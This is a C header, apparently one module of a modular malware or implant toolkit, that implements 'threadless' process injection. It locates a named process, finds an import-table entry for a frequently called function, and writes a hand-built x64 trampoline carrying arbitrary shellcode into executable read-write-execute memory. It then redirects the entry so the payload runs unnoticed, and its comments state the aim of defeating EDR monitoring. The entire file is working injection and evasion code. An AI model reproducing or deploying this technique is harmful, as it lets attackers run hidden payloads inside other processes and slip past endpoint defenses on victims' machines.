// chunk: evasion/threadless_inject
// depends: (none)
// provides: threadless_inject
// risk: low
// note: Threadless process injection — hijacks an existing function pointer in a
//       remote process (e.g., a DLL's import table entry or a callback registered
//       in a data structure) to redirect to our payload. No new thread created.
//       Defeats EDR monitoring of CreateRemoteThread / NtCreateThreadEx.
//       The payload executes when the target process naturally calls the hijacked
//       function. Based on the "ThreadlessInject" technique by CCob.

#ifndef CHUNK_THREADLESS_INJECT
#define CHUNK_THREADLESS_INJECT

#include <windows.h>
#include <tlhelp32.h>

static DWORD _find_process(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/*
 * _find_iat_entry: Find a writable IAT entry in the target process.
 * Returns the address of a function pointer in the target's IAT that
 * we can overwrite to redirect execution.
 *
 * Strategy: Look for a function that gets called periodically
 * (e.g., GetTickCount, Sleep, GetMessageW) so our payload triggers naturally.
 */
static PVOID _find_iat_entry(HANDLE hProcess, const char *target_func) {
    HMODULE hMods[256];
    DWORD cbNeeded;
    typedef BOOL (WINAPI *pEnumProcessModules)(HANDLE, HMODULE *, DWORD, LPDWORD);
    pEnumProcessModules EnumMods = (pEnumProcessModules)GetProcAddress(
        GetModuleHandleA("psapi.dll") ? GetModuleHandleA("psapi.dll") : LoadLibraryA("psapi.dll"),
        "EnumProcessModules");

    if (!EnumMods) return NULL;
    if (!EnumMods(hProcess, hMods, sizeof(hMods), &cbNeeded)) return NULL;

    /* Read the main module's PE header to find its IAT */
    BYTE dos_header[0x40];
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, hMods[0], dos_header, sizeof(dos_header), &bytesRead))
        return NULL;

    DWORD pe_offset = *(DWORD *)(dos_header + 0x3C);
    BYTE pe_header[0x200];
    if (!ReadProcessMemory(hProcess, (BYTE *)hMods[0] + pe_offset, pe_header, sizeof(pe_header), &bytesRead))
        return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)pe_header;
    DWORD import_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!import_rva) return NULL;

    /* Walk the import descriptors */
    IMAGE_IMPORT_DESCRIPTOR imp;
    BYTE *import_base = (BYTE *)hMods[0] + import_rva;

    for (int i = 0; i < 64; i++) {
        if (!ReadProcessMemory(hProcess, import_base + i * sizeof(imp), &imp, sizeof(imp), &bytesRead))
            break;
        if (!imp.Name) break;

        /* Read function names from OriginalFirstThunk (INT) */
        PVOID thunk_addr = (BYTE *)hMods[0] + imp.OriginalFirstThunk;
        PVOID iat_addr = (BYTE *)hMods[0] + imp.FirstThunk;

        for (int j = 0; j < 256; j++) {
            ULONGLONG thunk_data;
            if (!ReadProcessMemory(hProcess, (BYTE *)thunk_addr + j * 8, &thunk_data, 8, &bytesRead))
                break;
            if (!thunk_data) break;

            /* Skip ordinal imports */
            if (thunk_data & (1ULL << 63)) continue;

            /* Read the import name */
            char name_buf[64] = {0};
            if (!ReadProcessMemory(hProcess, (BYTE *)hMods[0] + (DWORD)thunk_data + 2, name_buf, 63, &bytesRead))
                continue;

            if (_stricmp(name_buf, target_func) == 0) {
                return (BYTE *)iat_addr + j * 8;
            }
        }
    }

    return NULL;
}

/*
 * threadless_inject: Inject payload into a target process without creating a thread.
 *
 * 1. Open target process
 * 2. Allocate RWX memory in target
 * 3. Write a trampoline:
 *    - Save registers
 *    - Execute payload shellcode
 *    - Restore original function pointer
 *    - Restore registers
 *    - Jump to original function
 * 4. Find IAT entry for a frequently-called function
 * 5. Overwrite IAT entry to point to our trampoline
 * 6. Wait for natural execution
 *
 * process_name: e.g., "explorer.exe"
 * payload: shellcode or function bytes
 * payload_size: size of payload
 * hook_func: IAT function to hijack (e.g., "GetTickCount")
 *
 * Returns TRUE on success.
 */
static BOOL threadless_inject(const char *process_name, BYTE *payload,
                              SIZE_T payload_size, const char *hook_func) {
    DWORD pid = _find_process(process_name);
    if (!pid) return FALSE;

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) return FALSE;

    /* Find the IAT entry to hijack */
    PVOID iat_entry = _find_iat_entry(hProcess, hook_func);
    if (!iat_entry) {
        CloseHandle(hProcess);
        return FALSE;
    }

    /* Read the original function pointer */
    ULONGLONG original_func = 0;
    SIZE_T bytesRead;
    ReadProcessMemory(hProcess, iat_entry, &original_func, 8, &bytesRead);

    /* Build trampoline: push regs → payload → restore IAT → pop regs → jmp original */
    SIZE_T tramp_size = payload_size + 128;
    PVOID remote_mem = VirtualAllocEx(hProcess, NULL, tramp_size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        CloseHandle(hProcess);
        return FALSE;
    }

    BYTE *trampoline = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tramp_size);
    SIZE_T off = 0;

    /* Save all volatile registers */
    trampoline[off++] = 0x50;                       /* push rax */
    trampoline[off++] = 0x51;                       /* push rcx */
    trampoline[off++] = 0x52;                       /* push rdx */
    trampoline[off++] = 0x41; trampoline[off++] = 0x50;  /* push r8 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x51;  /* push r9 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x52;  /* push r10 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x53;  /* push r11 */
    trampoline[off++] = 0x48; trampoline[off++] = 0x83;
    trampoline[off++] = 0xEC; trampoline[off++] = 0x28;  /* sub rsp, 0x28 (shadow space) */

    /* Inline the payload */
    memcpy(trampoline + off, payload, payload_size);
    off += payload_size;

    /* Restore IAT entry to original function (self-healing hook) */
    /* mov rax, iat_entry_address */
    trampoline[off++] = 0x48; trampoline[off++] = 0xB8;
    *(ULONGLONG *)(trampoline + off) = (ULONGLONG)iat_entry; off += 8;
    /* mov rcx, original_func */
    trampoline[off++] = 0x48; trampoline[off++] = 0xB9;
    *(ULONGLONG *)(trampoline + off) = original_func; off += 8;
    /* mov [rax], rcx */
    trampoline[off++] = 0x48; trampoline[off++] = 0x89; trampoline[off++] = 0x08;

    /* Restore registers */
    trampoline[off++] = 0x48; trampoline[off++] = 0x83;
    trampoline[off++] = 0xC4; trampoline[off++] = 0x28;  /* add rsp, 0x28 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x5B;  /* pop r11 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x5A;  /* pop r10 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x59;  /* pop r9 */
    trampoline[off++] = 0x41; trampoline[off++] = 0x58;  /* pop r8 */
    trampoline[off++] = 0x5A;                       /* pop rdx */
    trampoline[off++] = 0x59;                       /* pop rcx */
    trampoline[off++] = 0x58;                       /* pop rax */

    /* Jump to original function */
    trampoline[off++] = 0x48; trampoline[off++] = 0xB8;
    *(ULONGLONG *)(trampoline + off) = original_func; off += 8;
    trampoline[off++] = 0xFF; trampoline[off++] = 0xE0;  /* jmp rax */

    /* Write trampoline to remote process */
    SIZE_T written;
    WriteProcessMemory(hProcess, remote_mem, trampoline, off, &written);
    HeapFree(GetProcessHeap(), 0, trampoline);

    /* Overwrite IAT entry to point to our trampoline */
    ULONGLONG tramp_addr = (ULONGLONG)remote_mem;
    WriteProcessMemory(hProcess, iat_entry, &tramp_addr, 8, &written);

    CloseHandle(hProcess);
    return TRUE;
}

#endif
